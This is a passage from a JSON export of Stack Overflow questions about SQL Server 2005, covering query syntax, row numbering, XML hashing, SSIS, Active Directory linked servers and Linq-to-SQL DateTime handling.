error","body":"<p>I have a simple table running in SQL Server 2005 defined as</p>\n\n<pre><code>CREATE TABLE [dbo].[ap_purchases_tax_det](\n[invoice_s] [int] NOT NULL,\n[line_num] [smallint] NOT NULL,\n[tax_code] [varchar](10) NOT NULL,\n[tax_type] [varchar](2) NULL,\n[tax_det_s] [int] IDENTITY(1,1) NOT NULL,\n[old_entity] [varchar](14) NULL,\n[old_cc_code] [varchar](5) NULL,\n[old_vendor] [varchar](15) NULL,\n[old_invoice] [varchar](20) NULL,\n[citi] [varchar](1) NULL,\nCONSTRAINT [aaaaaap_purchases_tax_det_PK] PRIMARY KEY NONCLUSTERED \n(\n    [invoice_s] ASC,\n    [line_num] ASC,\n    [tax_code] ASC\n)WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]\n) ON [PRIMARY]\n</code></pre>\n\n<p>The tax_type field is filled with either 'W', 'V', 'B\", or '' (this one is not NULL).</p>\n\n<p>I need to get a boolean flag if tax_type is 'W', so I have the SQL:</p>\n\n<pre><code>select iif(tax_type = 'W',1,0) FROM dbo.ap_purchases_tax_det;\n</code></pre>\n\n<p>when I run this I get \"Incorrect syntax near '='.\".  This occurs even for a simple <code>tax_type = 'W'</code>.  The test for equality seems to work in the WHERE clause, but I need a flag, which means I would have to UNION together 2 selects.  This is actually part of a join that is a subquery in much larger statement so I don't want to do this.  I have tried excplicitly casting <code>tax_type = cast('W' as varchar(2))</code> to no avail. Same results if I use <code>ISNULL(tax_type,'x')</code>.</p>\n\n<p>I have no idea why the test for equality is not working, can someone provide guidance?</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":12703549,"title":"SQL Server 2005 : map Transaction_ID to @@SPID","body":"<p>Is there anyway to map <code>transaction_id</code> from somewhere like <code>sys.dm_tran_active_transactions</code>to an <code>SPID</code> in SQL Server 2005?</p>\n"},{"tags":["sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":9518108,"title":"travel database","body":"<p>I'm creating travel module for my project, which contain predefine 5 packages \nfor travel places, and also have 10 Vans(5 Ac and 5 nonAc), 10 mini buses, 5 Volvo buses(AC), </p>\n\n<p>and all charges for travel packages with each vechile is predefin,</p>\n\n<p>So how can i prepared database table for travel module?</p>\n\n<p>M creating three tables:</p>\n\n<pre><code>Travel(travel_id(foreignkey),\nnoofmembers,\nbookdate,vechiletype,acornonac)\n</code></pre>\n\n<p>travel_details</p>\n\n<pre><code>travelid(primarykey),\ntravelpackageid(foreignkey),\n(vechiletype(ac or nonac),\nvechilerate(with package charge),\nvechilestatus(a or na)\n</code></pre>\n\n<p>travel_package</p>\n\n<pre><code>travelpackageid(primarykey),\ntravelpackage\n</code></pre>\n"},{"tags":["linux","sql-server-2005","plesk","mediatemple","dedicated-server"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12684935,"title":"enable php-mssql on plesk 11 linux server(Media Temple)","body":"<p>I need to connect to both mssql and MySQL using php. so I tried to enable extension php-mssql using yum install my-mssql, when I have PHP 5 support, it says php-api missing. And get suggested to using php5.3 instead, after I switch, it get error php54-common is conflicted with php-common. </p>\n"},{"tags":["tsql","sql-server-2005","cross-apply"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12681579,"title":"Cross Apply of UDF missing Results","body":"<p>I am performing a SQL query similar to the following</p>\n\n<pre><code>SELECT fn.FullName, pn.LastName, pn.FirstName, pn.MI\nFROM Source.dbo.tblPerson fn\n    cross apply dbo.ParseFullName(fn.FullName) pn\n</code></pre>\n\n<p>the result looks fine for the first 85 rows the 86th+ always have NULL for columns derived from the UDF. If I add a where or order by clause to change the result set, it is always the first 85 rows that return the complete set of results. because the 85 number is so consistent, I am thinking that it is something that I am overlooking.</p>\n\n<p>Any help that anyone can provide would be great</p>\n"},{"tags":["sql","sql-server","sql-server-2005","row-number"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":75,"score":3,"question_id":12695858,"title":"How do to the opposite of \"row_number() over (partition by [Col] order by [Col])\"","body":"<p>I am trying to combine duplicate entries in a data table and give them a new number.</p>\n\n<p>Here is a example data set (<a href=\"http://data.stackexchange.com/stackoverflow/query/81485/query-for-http-stackoverflow-com-questions-12695858?opt.textResults=true\" rel=\"nofollow\">runnable copy</a>)</p>\n\n<pre><code>declare @tmpTable table\n    (ID Varchar(1), \n     First varchar(4), \n     Last varchar(5), \n     Phone varchar(13),\n     NonKeyField varchar(4))\n\ninsert into @tmpTable select 'A', 'John', 'Smith', '(555)555-1234', 'ASDF'\ninsert into @tmpTable select 'B', 'John', 'Smith', '(555)555-1234', 'GHJK'\ninsert into @tmpTable select 'C', 'Jane', 'Smith', '(555)555-1234', 'QWER'\ninsert into @tmpTable select 'D', 'John', 'Smith', '(555)555-1234', 'RTYU'\ninsert into @tmpTable select 'E', 'Bill', 'Blake', '(555)555-0000', 'BVNM'\ninsert into @tmpTable select 'F', 'Bill', 'Blake', '(555)555-0000', '%^&amp;*'\ninsert into @tmpTable select 'G', 'John', 'Smith', '(555)555-1234', '!#RF'\n\nselect row_number() over (partition by First, Last, Phone order by ID) NewIDNum, *  \nfrom @tmpTable order by ID\n</code></pre>\n\n<p>Right now it gives me the results </p>\n\n<pre><code>NewIDNum             ID   First Last  Phone         NonKeyField\n-------------------- ---- ----- ----- ------------- -----------\n1                    A    John  Smith (555)555-1234 ASDF\n2                    B    John  Smith (555)555-1234 GHJK\n1                    C    Jane  Smith (555)555-1234 QWER\n3                    D    John  Smith (555)555-1234 RTYU\n1                    E    Bill  Blake (555)555-0000 BVNM\n2                    F    Bill  Blake (555)555-0000 %^&amp;*\n4                    G    John  Smith (555)555-1234 !#RF\n</code></pre>\n\n<p>However that is the opposite of what I want, the <code>NewIDNum</code> resets its counter ever time it finds a new combination of the key. I want all of the same combination to have the same ID. So if it was behaving the way I wanted I would get the following results</p>\n\n<pre><code>NewIDNum             ID   First Last  Phone         NonKeyField\n-------------------- ---- ----- ----- ------------- -----------\n1                    A    John  Smith (555)555-1234 ASDF\n1                    B    John  Smith (555)555-1234 GHJK\n2                    C    Jane  Smith (555)555-1234 QWER\n1                    D    John  Smith (555)555-1234 RTYU\n3                    E    Bill  Blake (555)555-0000 BVNM\n3                    F    Bill  Blake (555)555-0000 %^&amp;*\n1                    G    John  Smith (555)555-1234 !#RF\n</code></pre>\n\n<p>What is the correct way to get the results I want?</p>\n\n<hr>\n\n<p><strong>I did not include this requirement in the original post</strong>:  I need the <code>NewIDNum</code> to produce the same numbers on subsequent runs of this query for the existing rows if more rows get added (assuming all new rows will have a higher ID \"value\" if a order by is done on the ID column)</p>\n\n<p>So if at a latter date the following was done</p>\n\n<pre><code>insert into @tmpTable select 'H', 'John', 'Smith', '(555)555-1234', '4321'\ninsert into @tmpTable select 'I', 'Jake', 'Jons', '(555)555-1234', '1234'\ninsert into @tmpTable select 'J', 'John', 'Smith', '(555)555-1234', '2345'\n</code></pre>\n\n<p>running the correct query again would give</p>\n\n<pre><code>NewIDNum             ID   First Last  Phone         NonKeyField\n-------------------- ---- ----- ----- ------------- -----------\n1                    A    John  Smith (555)555-1234 ASDF\n1                    B    John  Smith (555)555-1234 GHJK\n2                    C    Jane  Smith (555)555-1234 QWER\n1                    D    John  Smith (555)555-1234 RTYU\n3                    E    Bill  Blake (555)555-0000 BVNM\n3                    F    Bill  Blake (555)555-0000 %^&amp;*\n1                    G    John  Smith (555)555-1234 !#RF\n1                    H    John  Smith (555)555-1234 4321\n4                    I    Jake  Jons  (555)555-1234 1234\n1                    J    John  Smith (555)555-1234 2345\n</code></pre>\n"},{"tags":["sql","sql-server-2005","tsql"],"answer_count":3,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":1801,"score":3,"question_id":1038245,"title":"SQL Pivot based on value between two columns","body":"<p>I have a table in which I have, among other things, two columns, one for start date and another for end date.  I need to write a query that will return a column for each month of the year and the value of that column is 1 if the month is between 0 otherwise.  The PIVOT statement seems to be what I am looking for here, but from the best I can tell the PIVOT clause is looking to match values, not check if value is between two others.  Is the PIVOT clause the right construct here, or do I need to break down and write 12 case statements and then aggregate those?</p>\n"},{"tags":["sql-server-2005","maintenance"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":4964,"score":2,"question_id":987147,"title":"SQL 2005 Maintenance Cleanup Task .bak files not being deleted","body":"<p>I have a SQL 2005 Maintenance plan that runs a backup to create a .bak file, and, on successful completion is supposed to run a Maintenance Clean Up task to delete any .bak files in the folder the back up task saves to that are older than 5 days. </p>\n\n<p>My backups are being created, but my old files aren't being deleted. I don't see any errors in the log. I think that perhaps I have a permissions issue -- that the account the job is run under needs access to the folder the .bak files are to be deleted from. Does this seem like a likely cause of .bak files not being deleted?</p>\n\n<p>How do I find out what account the job is run under? I'm guessing it would be the SQL Agent account. I thought that would be the account named 'SQLServer2005AgentUser' so I tried giving that account full control, but my .bak files are still not being deleted. </p>\n\n<p>Should I take a different approach to cleaning up the old files? Or is there something else I'm doing wrong or not understanding?</p>\n"},{"tags":["sql","sql-server","string","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":99,"score":0,"question_id":12685862,"title":"Looking for multiples substrings within a SQL string","body":"<p>I have several occurrences of differences strings in the columns, like this example</p>\n\n<p><code>'dsasdasdsd'+'ewewewew'+'45454545'+(avg('uuuuuuu'))</code></p>\n\n<p>I need to split this string into several columns with the substrings that are between \naphostropes</p>\n\n<p>like this:</p>\n\n<pre><code>Column 1 = dsasdasdsd\nColumn 2 = ewewewew\nColumn 3 = 45454545\nColumn 4 = uuuuuuu\n</code></pre>\n\n<p>The numbers of apperances are random, thefore the length of the original column is also not fixed (from 50 char to > 1000)</p>\n"},{"tags":[".net","xml","tsql","sql-server-2005","xml-parsing"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":42,"score":1,"question_id":12688828,"title":"Normalising XML in SQLServer for hashing","body":"<p>I asked <a href=\"http://stackoverflow.com/q/12674327/395628\">this question</a> which led me to do the following.</p>\n\n<ul>\n<li>Create an XML representation of a C# object structure in order to pass it to SQLServer.</li>\n<li>Create a stored procedure which <em>hashes the XML</em> and then shreds the XML into related tables and also stores the hash in the root table for quick lookup.</li>\n</ul>\n\n<p>This means that I can pass complex object data to SQLServer and do a lookup on the hash rather than trying to shred and match the XML against the tables (which I can also do but is slow(er))...</p>\n\n<p>However - One of the nice things about XML is that you can format it eg indent it etc - and also - that attribute order is not important. BUT when you hash something formatting and indentation IS important. So what I do in C# is...</p>\n\n<ul>\n<li>Normalise the XML by putting all attributes in alphabetical order</li>\n<li>use .ToString(DisableFormatting) to remove extra formatting spaces</li>\n</ul>\n\n<p>This works fine, but when I'm testing it's easier to have <em>formatted</em> XML so I can see more easily what I'm passing to the stored proc.</p>\n\n<p>It would be nice if SQLServer could be trusted to preserve attribute order <a href=\"http://msdn.microsoft.com/en-us/library/ms187107%28v=sql.90%29.aspx\" rel=\"nofollow\">but it can't</a>...</p>\n\n<blockquote>\n  <p>The order of attributes in an XML instance is not preserved. When you\n  query the XML instance stored in the xml type column, the order of\n  attributes in the resulting XML may be different from the original XML\n  instance.</p>\n</blockquote>\n\n<p>This means that I can't use SQLServer's XML datatype to normalise the data.</p>\n\n<p>What bothers me is that at some point someone will be using my procs and think \"oh great, XML, attribute order doesn't matter, formatting doesn't matter, <em>the data represented is the same</em>\" However, when I hash this isn't going to be the case.</p>\n\n<p>Anyone got any solutions to this problem? I don't really want to write an XML parser in T-SQL!! Or use an XML parser someone else has written in order to normalise it. Why can't the SQLServer XML datatype just preserve attribute order? </p>\n\n<p>I suppose I can \"trust\" my app to always pass XML in the same format/order thus resulting in the same hash for the same object. But I'm uncomfortable with the idea that the stored proc has to also \"trust\" the app to do this. I would like to somehow be able to check the normalisation of the XML, it will obviously be more robust like that.</p>\n"},{"tags":["c++","sql-server-2005","bind","bcp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":95,"score":0,"question_id":12361882,"title":"Sending null values to an integer column in an SQL table from a C++ application","body":"<p>I am doing a bulk copy of program variables to a SQL Server 2005 table and I use <code>bcp_bind</code> and <code>bcp_sendrow</code> in a C++ application</p>\n\n<p>However, some of the integer columns in the table allow <code>null</code> values. I'm not quite sure how I should be sending <code>null</code> values at runtime using <code>bcp_sendrow</code> when the need arises to send a <code>null</code> value for one of the columns.</p>\n\n<p><a href=\"http://technet.microsoft.com/en-us/library/aa177853%28v=sql.80%29.aspx\" rel=\"nofollow\">Documentation</a> on <code>bcp_bind</code> says:</p>\n\n<blockquote>\n  <p>To bulk copy a row to the server containing a NULL value for the bound\n  column, the value of the instance's iIndicator member should be set to\n  SQL_NULL_DATA</p>\n</blockquote>\n\n<p>However this still doesn't make things quite clear. Am I supposed to have 2 different calls to <code>bcp_sendrow</code>: one for the not null case and another for the null case?</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12682626,"title":"Simple INSERT Query in SQL Server","body":"<p>I m looking to a way to insert into database Table T1 from T2 (append operation_</p>\n\n<p>Table 1 : dbo.t1</p>\n\n<pre><code>col1   col2\n----   -----\n1       ABC\n2       ABCr  \n3       ABCs\n4       ABCd\n</code></pre>\n\n<p>Table 2 : dbo.t2</p>\n\n<pre><code>col1   col2\n----   -----\n7       ABCe\n8       ABCy  \n</code></pre>\n\n<p>Now , table 1 becomes</p>\n\n<pre><code>col1   col2\n----   -----\n1       ABC\n2       ABCr  \n3       ABCs\n4       ABCd\n7       ABCe\n8       ABCy  \n</code></pre>\n\n<p>SQL query , I m using is:</p>\n\n<pre><code>select * \ninto dbo.t1\nfrom dbo.t2\n</code></pre>\n\n<p>I know it would way too simple using #temp table.</p>\n\n<p>I m looking for a way so that I just append the rows from T2 to T1 and keep performance as well. The existing rows of T1 is not touch at all.</p>\n\n<p>Any help would be helpful.</p>\n\n<p>Thanks !!!</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":55,"score":-3,"question_id":8054884,"title":"SQL server retrieve data from table","body":"<pre><code>TABLE\n: Customer \nKEY\n:- CustomerID \nOther\ncolumns: Name, age, etc TABLE\n: Customer_address \nKeys\n: AddrerssID, CustomerID \nOther\ncolumns: Street, city, STATE, etc\n</code></pre>\n\n<p>Please give me ALL customers.\nI also want to see the customer address if the <code>state = FL</code>. Only create one SQL statement. The SQL below starts this way. Please fill in the rest.</p>\n"},{"tags":["php","sql-server-2005","database-connection"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":145,"score":0,"question_id":11225222,"title":"PHP SQL Server 2005 Standard Edition connection timeout","body":"<p>I've searched through endless solutions for connection problems with PHP and SQL Server 2005 and still no luck. I'm using SQL Server 2005 Standard Edition.<br>\nHere's the code:</p>\n\n<pre><code>$server = \"MYLAP01\\\\SQLEXPRESS\";\n$options = array(\"Database\" =&gt; \"test1\");\n$conn = sqlsrv_connect($server, $options);\n\nif ($conn === false) die(\"&lt;pre&gt;\".print_r(sqlsrv_errors(), true));echo \"Successfully connected!\";\n\nsqlsrv_close($conn);\n</code></pre>\n\n<p>And the output:</p>\n\n<pre>Array\n(\n    [0] => Array\n        (\n            [0] => 08001\n            [SQLSTATE] => 08001\n            [1] => -1\n            [code] => -1\n            [2] => [Microsoft][SQL Server Native Client 11.0]SQL Server Network Interfaces: Error Locating Server/Instance Specified [xFFFFFFFF]. \n            [message] => [Microsoft][SQL Server Native Client 11.0]SQL Server Network Interfaces: Error Locating Server/Instance Specified [xFFFFFFFF]. \n        )\n\n    [1] => Array\n        (\n            [0] => HYT00\n            [SQLSTATE] => HYT00\n            [1] => 0\n            [code] => 0\n            [2] => [Microsoft][SQL Server Native Client 11.0]Login timeout expired\n            [message] => [Microsoft][SQL Server Native Client 11.0]Login timeout expired\n        )\n\n    [2] => Array\n        (\n            [0] => 08001\n            [SQLSTATE] => 08001\n            [1] => -1\n            [code] => -1\n            [2] => [Microsoft][SQL Server Native Client 11.0]A network-related or instance-specific error has occurred while establishing a connection to SQL Server. Server is not found or not accessible. Check if instance name is correct and if SQL Server is configured to allow remote connections. For more information see SQL Server Books Online.\n            [message] => [Microsoft][SQL Server Native Client 11.0]A network-related or instance-specific error has occurred while establishing a connection to SQL Server. Server is not found or not accessible. Check if instance name is correct and if SQL Server is configured to allow remote connections. For more information see SQL Server Books Online.\n        )\n\n)\n</pre>\n"},{"tags":["sql","sql-server-2005","data-structures","orm"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":45,"score":2,"question_id":12674327,"title":"Quickest method for matching nested XML data against database table structure","body":"<p>I have an application which creates <code>datarequests</code> which can be quite complex. These need to be stored in the database as tables. An outline of a <code>datarequest</code> (as XML) would be...</p>\n\n<pre><code>&lt;datarequest&gt;\n  &lt;datatask view=\"vw_ContractData\" db=\"reporting\" index=\"1\"&gt;\n    &lt;datefilter modifier=\"w0\"&gt;\n      &lt;filter index=\"1\" datatype=\"d\" column=\"Contract Date\" param1=\"2009-10-19 12:00:00\" param2=\"2012-09-27 12:00:00\" daterange=\"\" operation=\"Between\" /&gt;\n    &lt;/datefilter&gt;\n    &lt;filters&gt;\n      &lt;alternation index=\"1\"&gt;\n        &lt;filter index=\"1\" datatype=\"t\" column=\"Department\" param1=\"Stock\" param2=\"\" operation=\"Equals\" /&gt;\n      &lt;/alternation&gt;\n      &lt;alternation index=\"2\"&gt;\n        &lt;filter index=\"1\" datatype=\"t\" column=\"Department\" param1=\"HR\" param2=\"\" operation=\"Equals\" /&gt;\n      &lt;/alternation&gt;\n      &lt;/filters&gt;\n    &lt;series column=\"Turnaround\" aggregate=\"avg\" split=\"0\" splitfield=\"\" index=\"1\"&gt;\n      &lt;filters /&gt;\n    &lt;/series&gt;\n    &lt;series column=\"Requested 3\" aggregate=\"avg\" split=\"0\" splitfield=\"\" index=\"2\"&gt;\n      &lt;filters&gt;\n        &lt;alternation index=\"1\"&gt;\n          &lt;filter index=\"1\" datatype=\"t\" column=\"Worker\" param1=\"Malcom\" param2=\"\" operation=\"Equals\" /&gt;\n        &lt;/alternation&gt;          \n      &lt;/filters&gt;\n    &lt;/series&gt;\n    &lt;series column=\"Requested 2\" aggregate=\"avg\" split=\"0\"  splitfield=\"\" index=\"3\"&gt;\n      &lt;filters /&gt;\n    &lt;/series&gt;\n    &lt;series column=\"Reqested\" aggregate=\"avg\" split=\"0\" splitfield=\"\" index=\"4\"&gt;\n      &lt;filters /&gt;\n    &lt;/series&gt;\n  &lt;/datatask&gt;\n&lt;/datarequest&gt;\n</code></pre>\n\n<p>This encodes a datarequest comprising a daterange, main filters, series and series filters. Basically any element which has the <code>index</code> attribute can occur multiple times within its parent element - the exception to this being the <code>filter</code> within <code>datefilter</code>.</p>\n\n<p>But the structure of this is kind of academic, the problem is more fundamental:</p>\n\n<p>When a request comes through, XML like this is sent to SQLServer as a parameter to a stored proc. This XML is shredded into a de-normalised table and then written iteratively to normalised tables such as <code>tblDataRequest (DataRequestID PK)</code>, <code>tblDataTask</code>, <code>tblFilter</code>, <code>tblSeries</code>. This is fine.</p>\n\n<p>The problem occurs when I want to <strong>match a given XML defintion with one already held in the DB</strong>. I currently do this by...</p>\n\n<ul>\n<li>Shredding the XML into a de-normalised table</li>\n<li>Using a CTE to pull <em>all the existing data</em> in the database into that same de-normalised form</li>\n<li>Matching using a huge <code>WHERE</code> condition (34 lines long)</li>\n</ul>\n\n<p>..This will return me any DataRequestID which exactly matches the XML given. I fear that this method will end up being painfully slow - partly because I don't believe the CTE will do any clever filtering, it will pull all the data every single time <em>before</em> applying the huge <code>WHERE</code>.</p>\n\n<p>I have thought there must be better solutions to this eg</p>\n\n<ul>\n<li>When storing a <code>datarequest</code>, also store a hash of the datarequest somehow and simply match on that. In the case of collision, use the current method. I wanted however to do this using set-logic. And also, I'm concerned about irrelevant small differences in the XML changing the hash - spurious spaces etc.</li>\n<li>Somehow perform the matching iteratively from the bottom up. Eg produce a list of filters which match on the lowest level. Use this as part of an <code>IN</code> to match Series. Use this as part of an <code>IN</code> to match DataTasks etc etc. The trouble is, I start to black-out when I think about this for too long.</li>\n</ul>\n\n<p><strong>Basically - Has anyone ever encountered this kind of problem before (they must have). And what would be the recommended route for tackling it?</strong> example (pseudo)code would be great :) </p>\n"},{"tags":["sql-server-2005","ssis"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1112,"score":0,"question_id":3119867,"title":"SSIS Package failing with \"Failed to acquire connection\" error","body":"<p>We have an SSIS package that is launched from a web service.  In the Dev environment, everything works fine, but in the QA environment I get the following error when trying to run the package: \"Failed to acquire connection [ConnectionName]. Connection may not be configured correctly or you may not have the right permissions on this connection.\"</p>\n\n<p>The connection uses SQL login, not integrated. The login itself has the appropriate privileges. The SSIS package is located on the file system, not on SQL server.  I've used DTCPing and everything checks out fine between the SQL server and the Utility server. Unfortunately I know very little about SSIS itself, and am a bit of a loss as to what could be the problem.  Any suggestions would be greatly appreciated.</p>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":12674275,"title":"Find all foreign key references to a certain table","body":"<p>I have a table that I would like to find all the other tables that foreign key it. I thought this thread had the answer: <a href=\"http://stackoverflow.com/questions/483193/how-can-i-list-all-foreign-keys-referencing-a-given-table-in-sql-server-2005\">How can I list all foreign keys referencing a given table in SQL Server 2005?</a></p>\n\n<p>But after trying those things, it doesn't actually list all the tables.</p>\n"},{"tags":["sql-server-2005","aggregate-functions","divide-by-zero"],"answer_count":6,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1622,"score":0,"question_id":3516111,"title":"SQL Server: How to handle divide by 0 cases in query","body":"<p>I have a query that looks like this, and which is getting a percentage:</p>\n\n<pre><code>SELECT SUM(convert(decimal(3,2),\n          CASE WHEN Status_ID = 1 AND State_ID = 14 THEN 1 ELSE 0 END))/\n          SUM(convert(decimal(3,2),CASE WHEN State_ID = 14 THEN 1 ELSE 0 END)) * 100\nFROM SomeTable\n</code></pre>\n\n<p>This may return something like 59.77803 in a normal case. But it turns that there are (rightly) cases when the second SUM -- the denominator -- could be 0. Does anyone know of a way to account for this case and avoid a divide by 0 exception?</p>\n\n<p>I'm using SQL Server 2005. Thanks.</p>\n"},{"tags":["sql-server-2005","active-directory","ldap","adsi"],"answer_count":1,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":3135,"score":2,"question_id":407671,"title":"Query AD from sql server 2005","body":"<p>I am attempting to query AD via ldap from within SQL Server 2005 but get the following error:</p>\n\n<p>Msg 7321, Level 16, State 2, Line 1\nAn error occurred while preparing the query \"SELECT NAME,MAIL FROM \"LDAP:///CN=foo,CN=Users,DC=bar,DC=com\"\" for execution against OLE DB provider \"ADsDSOObject\" for linked server \"ADSI\".</p>\n\n<p>This is after executing the following stored proc:<br />\nexec sp_addlinkedserver 'ADSI', 'Active Directory Services 2.5', 'ADsDSOObject', 'adsdatasource'</p>\n\n<p>Currently I'm running the query on my local SQL Server 2005 instance.  I've tried changing the security context to 1) Made Without... , 2) made using the login's current..., and 3) Be made using this security context: specifying my own domain account.  Same error with all three.</p>\n\n<p>Not sure if it matters, but \"bar\" (see ldap query above) is not the domain of either my machine (local sql server instance) or the ldap server.</p>\n\n<p>Any ideas?</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005","sql-server-2008-r2"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":35,"score":2,"question_id":12668343,"title":"how can i get name of table and its column while checking the reference of any value in multiple columns?","body":"<p>When deleting any Team from team table, i need to check that teamId is available in other tables or not. for this i am using following query:-</p>\n\n<pre><code>        select  count(TeamId) from \n        ( select TeamId from Project union all \n          select  TeamId from TeamMember union all \n          select  TeamId from Department union all \n          select TeamId from Role   union all \n        ) as Id where TeamId = 1\n</code></pre>\n\n<p>this query is working fine, and returns number of count. </p>\n\n<p>but now i need name of that table and its column, where i found that teamId. </p>\n\n<p>if it is possible than please give me right solution.</p>\n\n<p>thanks in advance..</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":70,"score":1,"question_id":12668181,"title":"How to remove timestamp from date without converting it in varchar in sql server?","body":"<p>I am comparing a \"date\" with current date(GETDATE()) using DATEDIFF().</p>\n\n<p>The problem i am facing is that the \"date\" is in dd/MM/yyyy format and the date i am getting \nusing GETDATE() includes the timestamp also.</p>\n\n<p>Please guide me how to remove the timestamp from GETDATE(),and also want to compare these two dates.</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["sql-server","sql-server-2005","sql-server-2008","rowlocking"],"answer_count":3,"favorite_count":5,"up_vote_count":14,"down_vote_count":0,"view_count":9004,"score":14,"question_id":3114826,"title":"Is it possible to force row level locking in SQL Server?","body":"<p>I can see how to turn off row level and page level locking in SQL Server, but I cannot find a way to force SQL Server to use row level locking. Is there a way to force SQL Server to use row level locking and NOT use page level locking?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":12665844,"title":"add primary row to query results","body":"<p>How do I add a primary row  to a query result in MSSQL 2005. Here's an example of what I need to return?</p>\n\n<p>Here are the two queries</p>\n\n<p>query 1</p>\n\n<pre><code>select product_id, sku from products\n</code></pre>\n\n<p>query 2 </p>\n\n<pre><code>select product_id, sku from childproducts\n</code></pre>\n\n<p>The results should look like this. (without the query 1, of course)</p>\n\n<pre><code>    row 1: products.product_id, products.sku   (comes from one parent table)\n    row 2: childproducts.product_id, childproducts.sku   (comes from child table)\n    row 3: childproducts.product_id, childproducts.sku   (comes from child table)\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":72,"score":0,"question_id":12312161,"title":"SQL Server 2005 Agent Jobs - memory problems","body":"<p>In our company we have a problem with SQL Server Agent jobs. We have 74 Jobs that are enabled and running each day with different schedules set and of course they are overlaping because their runtime differs in length.</p>\n\n<p>We suspect that while some jobs are executing some other Job starts executing too, which has a high memory consumption so it hangs up other running Jobs and they fail (at the same time or in a matter of 1 - 3 seconds) with message:</p>\n\n<blockquote>\n  <p>There is insufficient system memory to run this query. [SQLSTATE 42000] (Error 701).  The step failed.</p>\n</blockquote>\n\n<p>Is there a solution or maybe advices how to discover a problem?</p>\n\n<p>What I've tried:</p>\n\n<ol>\n<li>Change the execution times of Jobs;</li>\n<li>Use a SQL Server Profiler to see which SPs are executing by Agent Jobs;</li>\n<li>Tried to split some Jobs in 3 - 4 pieces because they had 18-22 Steps inside;</li>\n<li>And of course - googled.</li>\n</ol>\n"},{"tags":["asp.net","sql-server-2005","linq-to-sql","datetime","update-statement"],"answer_count":1,"favorite_count":3,"up_vote_count":14,"down_vote_count":0,"view_count":838,"score":14,"question_id":8010507,"title":"Linq-to-SQL and DateTime weirdness","body":"<p>We have really strange and inconsistent behavior with <a href=\"http://en.wikipedia.org/wiki/Language_Integrated_Query#LINQ_to_SQL_.28formerly_called_DLINQ.29\" rel=\"nofollow\">Linq-to-SQL </a> here.</p>\n\n<p>Our application is installed at quite a few customers' sites, and it works just fine for the most part. One of the queries in Linq-to-SQL updates a table and set a <code>DateTime</code> column to a new value.</p>\n\n<p>In all the cases - including our development and test systems - this Linq-to-SQL statement gets translated into something along the lines of:</p>\n\n<pre><code>UPDATE dbo.OurTable \nSET WorkTimeStamp = @WTS \nWHERE ID = @ID\n\n@WTS = '2011-11-04 14:15:25', @ID = 555\n</code></pre>\n\n<p>However, at one customer's site, for reasons that aren't clear to us (yet), this update gets translated into:</p>\n\n<pre><code>UPDATE dbo.OurTable \nSET WorkTimeStamp = @WTS \nWHERE ID = @ID\n\n@WTS = 'Nov  4 2011 02:15:25PM', @ID = 555\n</code></pre>\n\n<p>and for some reason then fails on <a href=\"http://en.wikipedia.org/wiki/Microsoft_SQL_Server#SQL_Server_2005\" rel=\"nofollow\">SQL Server 2005</a>.</p>\n\n<p>Now, that customer's servers (web server and SQL Server) have US-English versions of Windows Server 2008 installed; the language in SQL Server is set to <code>us_english</code>, the date format is set to <code>mdy</code>, the user account running the update has its language set to <code>English</code> in SQL Server ..... and that setup is the same elsewhere (for example, on our test server infrastructure).</p>\n\n<p>So my question really is:</p>\n\n<ol>\n<li><p><strong>Why on earth</strong> does Linq-to-SQL suddenly create a totally different representation of the same <code>DateTime</code> to send to SQL Server? Is there any knob to turn to control this?</p></li>\n<li><p>And why can't ADO.NET and the SQL Server 2005 SP2 database handle that <code>UPDATE</code> statement correctly? We're getting an error in our log that reads:</p></li>\n</ol>\n\n<blockquote>\n  <p>SqlTypeException - SqlDateTime overflow. Must be between 1/1/1753 12:00:00 AM and 12/31/9999 11:59:59 PM.</p>\n</blockquote>\n\n<p>It seems to be a .NET error (more than a SQL Server error) and it seems as if .NET cannot really interpret that <code>Nov  4 2011 02:15:25PM</code> as a valid <code>DateTime</code> for some reason. When attempting to run the generated UPDATE statement in <a 